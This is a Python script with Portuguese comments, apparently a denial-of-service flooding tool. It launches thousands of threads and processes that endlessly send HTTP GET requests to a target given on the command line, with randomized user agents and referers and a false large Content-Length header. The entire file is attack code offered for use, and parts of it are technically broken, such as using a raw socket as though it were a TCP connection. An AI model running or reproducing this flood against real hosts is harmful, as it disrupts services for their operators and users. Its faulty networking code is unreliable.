import socket
import sys
import random
import threading
import time
from multiprocessing import Process

# Função para ler os User Agents de um arquivo
def read_user_agents(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

# Função para ler os Referers de um arquivo
def read_referers(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

# Lista de User Agents e Referers
user_agents = read_user_agents("useragents.txt")
referers = read_referers("referers.txt")

# Função para enviar requisições HTTP GET com User Agent e Referer randomizados
def http_get(url):
    while True:
        try:
            # Criação do socket
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.connect((url, 80))
            # Escolhe um user agent e referer aleatório
            user_agent = random.choice(user_agents)
            referer = random.choice(referers)
            # Construção da requisição HTTP GET
            request = "GET / HTTP/1.1\r\n"
            request += "Host: " + url + "\r\n"
            request += "User-Agent: " + user_agent + "\r\n"
            request += "Referer: " + referer + "\r\n"
            request += "Connection: keep-alive\r\n"
            request += "Content-Length: 1000000\r\n"  # Tamanho do payload
            request += "\r\n"
            # Fragmentação do pacote
            fragments = [request[i:i+1500] for i in range(0, len(request), 1500)]
            # Envio dos fragmentos
            for fragment in fragments:
                s.send(fragment.encode())
        except socket.error:
            print("Erro ao enviar requisição")
        finally:
            s.close()

# Função para iniciar o ataque
def start_attack(url, duration):
    threads = []
    for _ in range(3014):
        t = threading.Thread(target=http_get, args=(url,))
        t.start()
        threads.append(t)

    processes = []
    for _ in range(2017):
        p = Process(target=http_get, args=(url,))
        p.start()
        processes.append(p)

    # Tempo de ataque
    time.sleep(duration)

    # Parar as threads
    for t in threads:
        t.join()

    # Parar os processos
    for p in processes:
        p.terminate()
        p.join()

# Execução do ataque
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python app.py <url> <duration>")
        sys.exit(1)

    url = sys.argv[1]
    duration = int(sys.argv[2])
    print("Iniciando ataque...")
    start_attack(url, duration)
